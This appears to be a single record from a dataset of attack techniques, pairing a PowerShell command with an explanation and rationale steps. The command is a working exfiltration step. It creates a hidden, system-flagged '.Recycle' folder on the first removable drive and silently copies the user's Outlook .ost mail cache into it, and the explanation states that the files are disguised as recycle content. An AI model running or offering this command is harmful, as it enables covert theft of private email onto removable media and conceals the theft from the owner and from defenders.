command: $usb=((Get-CimInstance Win32_LogicalDisk -Filter "DriveType=2" | Select -First 1 -ExpandProperty DeviceID)+'\'); $dst=Join-Path $usb '.Recycle'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; (Get-Item $dst).Attributes='Hidden, System'; $mail = Get-ChildItem "$env:USERPROFILE\AppData\Local\Microsoft\Outlook" -Filter *.ost -ErrorAction SilentlyContinue; if($mail){ Copy-Item $mail -Destination $dst -Force }
explanation: Copies Outlook cache files to a hidden/system folder on the removable drive using Copy-Item, disguising them as recycle content.
rationale_steps: Create a hidden/system folder on USB
Copy the files to USB using Copy-Item
